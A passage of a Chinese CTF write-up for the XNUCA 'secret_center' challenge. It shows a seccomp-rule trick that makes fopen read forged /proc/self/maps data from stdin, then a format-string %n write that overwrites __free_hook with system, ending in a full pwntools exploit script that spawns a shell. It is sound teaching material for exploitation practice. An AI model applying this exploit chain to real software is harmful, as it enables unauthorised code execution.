      signed char _vtable_offset;
      char _shortbuf[1];
      /*  char* _save_gptr;  char* _save_egptr; */
      _IO_lock_t *_lock;
    #ifdef _IO_USE_OLD_IO_FILE
    };
而fopen中真正打开并填写fileno字段的函数在\libio\fileops.c中，
    _IO_FILE *
    _IO_file_open (_IO_FILE *fp, const char *filename, int posix_mode, int prot,
               int read_write, int is32not64)
    {
      int fdesc;
    #ifdef _LIBC
      if (__glibc_unlikely (fp->_flags2 & _IO_FLAGS2_NOTCANCEL))
        fdesc = open_not_cancel (filename,
                     posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot);
      else
        fdesc = open (filename, posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot);
    #else
      fdesc = open (filename, posix_mode, prot);
    #endif
      if (fdesc _fileno = fdesc;
      ...
    }
由于我们可以控制seccomp从而控制系统调用的访问，我们可以将此次打开返回ERROR
，而此时，open的返回值为0，此时fopen并不认为文件打开失败，而是认为其fileno是0，此时程序会从STDIN中读取数据，进行判断。
既然可以控制程序读入的内容，我们可以输入一个伪造的maps数据，使其认为内存是不可写的，这样就可以绕过判断，构造如下数据：
    000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/p4nda
这样我们可以绕过fprintf_chk判断，利用%n来写数据了。
## 利用思路
### 沙箱构造
我们可以构造这样一个沙箱规则，当遇到系统调用时open时，判断其参数的最后一个字节是否是libc中“/proc/self/maps”的地址，如果是就返回ERROR，否则继续。
后续还有一个坑点，当fopen检查完后，会fclose关闭上述文件，此时用户stdin会被关闭，造成无法后续输入，这样简单，只需把close调用也关闭即可。
最终沙箱规则如下：
    A = arch
    A == ARCH_X86_64 ? next : dead
    A = sys_number
    A == close ? dead : next
    A == exit_group ? dead : next
    A == open ? next : allow
    A = args[0]
    A &= 0xff
    A == 0x7c ? dead : next
    allow:
    return ALLOW
    dead:
    return ERRNO(0)
利用seccomp-tools生成这样的规则：
    └─[$] <> seccomp-tools asm rule.asm -a amd64 -f raw | seccomp-tools disasm -     line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
     0002: 0x20 0x00 0x00 0x00000000  A = sys_number
     0003: 0x15 0x06 0x00 0x00000003  if (A == close) goto 0010
     0004: 0x15 0x05 0x00 0x000000e7  if (A == exit_group) goto 0010
     0005: 0x15 0x00 0x03 0x00000002  if (A != open) goto 0009
     0006: 0x20 0x00 0x00 0x00000010  A = args[0]
     0007: 0x54 0x00 0x00 0x000000ff  A &= 0xff
     0008: 0x15 0x01 0x00 0x0000007c  if (A == 124) goto 0010
     0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0010: 0x06 0x00 0x00 0x00050000  return ERRNO(0)
### 格式化字符串
已经知道了如何绕过%n的检测了，由于没有已知的地址，向哪里写数据又是一个问题，先看一下栈上有哪些数据吧
    Breakpoint __fprintf_chk
    pwndbg> x /40gx $rsp
    0x7fffffffd328: 0x0000555555554f4d  0x0000000000000000
    0x7fffffffd338: 0x0000007b00000000  0x00000000ff0a7025
    0x7fffffffd348: 0x0000000000000000  0x0000000000000000
    0x7fffffffd358: 0x0000000000000000  0xff000000ff000000
    0x7fffffffd368: 0x0000ff0000000000  0x0000000000000000
    0x7fffffffd378: 0x0000000000000000  0x0000000000000000
    0x7fffffffd388: 0x00007ffff7b09ef9  0x00007ffff7dd1b20
    0x7fffffffd398: 0x0000000000000080  0x0000000000000000
    0x7fffffffd3a8: 0x00007ffff7a948c9  0x0000000000000000
    0x7fffffffd3b8: 0x00007ffff7a8e86b  0x0000000000000000
    0x7fffffffd3c8: 0x00000000000000a0  0x0000000000000fff
    0x7fffffffd3d8: 0xfffffffffffff000  0x0000555555757000
    0x7fffffffd3e8: 0x0000000000001000  0x00000000f7dd7390
    0x7fffffffd3f8: 0x0000000000000000  0x00007fffffffd530
    0x7fffffffd408: 0x00007ffff7ffea88  0x00007fffffffd560
    0x7fffffffd418: 0x00007fffffffd5c0  0x00000000ffffffff
    0x7fffffffd428: 0x00007ffff7dd1b20  0x0000000000000080
    0x7fffffffd438: 0x00007ffff7dd1b78  0x00007ffff7dd1b78
    0x7fffffffd448: 0x0000000000002710  0x0000000000000000
    0x7fffffffd458: 0x000000000000000a  0x00007fffffffd57c
    pwndbg> x /s 0x0000555555757010
    0x555555757010: "DwHxGpmDtDevggh"...
可以看到，在0x7fffffffd3e0这里，有一个离secret很近的地址，可以通过低字节修改使其指向secret，这样由于判定条件时，不相等的位置是否等于strlen(secret)，这样只要我们向secret写\0，就可以很容易绕过check了，构造格式化字符串如下：
    fmt = ("%256p"*0x19+'%n').ljust(0xa0,'a')
    input(0x120,fmt+'\x10')#7
此时可以拿到vmmap内容，后续可以再次通过格式化字符串修改__free_hook为system就可以拿到shell，就是这样的格式化字符串构造有点烦...
堆漏洞也可以利用，不过由于有访问次数的限制，我总是差一次访问，就没有细究这种方法是否可行。
### EXP
    from pwn import *
    import time
    debug=0
    elf = ELF('./secret_center')
    libc_name = '/lib/x86_64-linux-gnu/libc-2.23.so'
    libc = ELF(libc_name)
    context.log_level = 'debug'
    if debug:
        p= process('./secret_center')
    else:
        #p = remote('106.75.73.20', 8999)#process('./pwn1')
        p = remote('127.0.0.1', 10006)
    '''
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
     0002: 0x20 0x00 0x00 0x00000000  A = sys_number
     0003: 0x15 0x06 0x00 0x00000003  if (A == close) goto 0010
     0004: 0x15 0x05 0x00 0x000000e7  if (A == exit_group) goto 0010
     0005: 0x15 0x00 0x03 0x00000002  if (A != open) goto 0009
     0006: 0x20 0x00 0x00 0x00000010  A = args[0]
     0007: 0x54 0x00 0x00 0x000000ff  A &= 0xff
     0008: 0x15 0x01 0x00 0x0000007c  if (A == 124) goto 0010
     0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0010: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
     0011: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
    '''
    def z(a=''):
        if debug:
            gdb.attach(p,a)
    def delete():
        p.recvuntil('>\n')
        p.sendline('3')
    def guard_ready():
        p.recvuntil('>\n')
        p.sendline('4')
    def set_guard():
        p.recvuntil('>\n')
        p.sendline('5')
    def edit(size,content):
        p.recvuntil('>\n')
        p.sendline('6')
        p.recvuntil('size: ')
        p.sendline(str(size))
        p.recvuntil('Content: \n')
        p.send(content) 
    def input(size,content):
        p.recvuntil('>\n')
        p.sendline('2')
        p.recvuntil('Secret Size: ')
        p.sendline(str(size))
        p.recvuntil('Content: \n')
        p.send(content)
        #sleep(0.1)
    def rule(code,jt ,jf ,k):
        return p16(code) + p8(jt) + p8(jf) + p32(k) 
    def build_rule():
        payload = ''
        payload+= rule(0x20 ,0x00, 0x00, 0x00000004) #  A = arch
        payload+= rule(0x15 ,0x00, 0x08, 0xc000003e) #  if (A != ARCH_X86_64) goto 0010
        payload+= rule(0x20 ,0x00, 0x00, 0x00000000) #  A = sys_number
        payload+= rule(0x15 ,0x06, 0x00, 0x00000003) #  if (A == close) goto 0010
        payload+= rule(0x15 ,0x05, 0x00, 0x000000e7) #  if (A == exit_group) goto 0010
        payload+= rule(0x15 ,0x00, 0x03, 0x00000002) #  if (A != open) goto 0009
        payload+= rule(0x20 ,0x00, 0x00, 0x00000010) #  A = args[0]
        payload+= rule(0x54 ,0x00, 0x00, 0x000000ff) #  A &= 0xff
        payload+= rule(0x15 ,0x01, 0x00, 0x0000007c) #  if (A == 124) goto 0010
        payload+= rule(0x06 ,0x00, 0x00, 0x7fff0000) #  return ALLOW
        payload+= rule(0x06 ,0x00, 0x00, 0x00050000) #  return ERRNO(2)
        return payload
    input(0xF0 ,'p4nda') #1
    delete()#2
    guard_ready()#3
    rule_data = build_rule()#4
    edit(len(rule_data),rule_data)#5
    set_guard()#6
    #z('b fopen\nb __fprintf_chk\nc')
    fmt = ("%256p"*0x19+'%n').ljust(0xa0,'a')
    input(0x120,fmt+'\x10')#7
    p.recvuntil("Not Good Secret :P\n\n")
    maps = '000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/p4nda'
    p.sendline(maps)
    input(0x68,'\x00')#8
    libc_address = 0
    heap_address = 0
    pie = 0
    while 1:
        tmp = p.readline()
        if "close" in tmp:
            tmp+= p.readline()
            tmp.replace("It's close.. Try to get a shell!\n",'')
        print '[?]',tmp#.split('-')[0]
        if ('libc-2.23.so' in tmp):
            addr = int('0x'+tmp.split('-')[0],16)
            if libc_address == 0:
                libc_address = addr
        if 'heap' in tmp:
            addr = int('0x'+tmp.split('-')[0],16)
            if heap_address == 0:
                heap_address = addr
        if 'secret_center' in tmp:
            addr = int('0x'+tmp.split('-')[0],16)
            if pie == 0:
                pie = addr
        if (libc_address*heap_address*pie != 0):
            break
    print '[+]libc_address',hex(libc_address)
    print '[+]heap_address',hex(heap_address)
    print '[+]pie',hex(pie)
    now = 0
    last= 0
    fmt = ('%256p'*33)
    target = libc_address+libc.symbols['system']
    where  = libc_address+libc.symbols['__free_hook']
    for i in range(6):
        now = (target>>(i*8))&0xff
        if last<now:
            fmt+= '%'+str(now-last)+'c' + '%hhn'
        else:
            fmt+= '%'+str(0x100+now-last)+'c'+ '%hhn'
        last =  now
    fmt+=';sh'
    fmt = fmt.ljust(0xe0,'\0')
    for i in range(6):
        fmt+= p64(0x31)+p64(where+i)    
    input(0x150,fmt+'\0')#9
    print 'fmt:',hex(len(fmt)),fmt
    p.recvuntil('It\'s close.. Try to get a shell!')
    p.sendline(maps)
    delete()
    p.interactive()
总之，题目考察了很多东西，还是很有意思的一道题目，感谢AFang师傅的帮助，此篇被我同步到了[我的blog](http://p4nda.top/2018/11/26/XNUCA-secretcenter/)。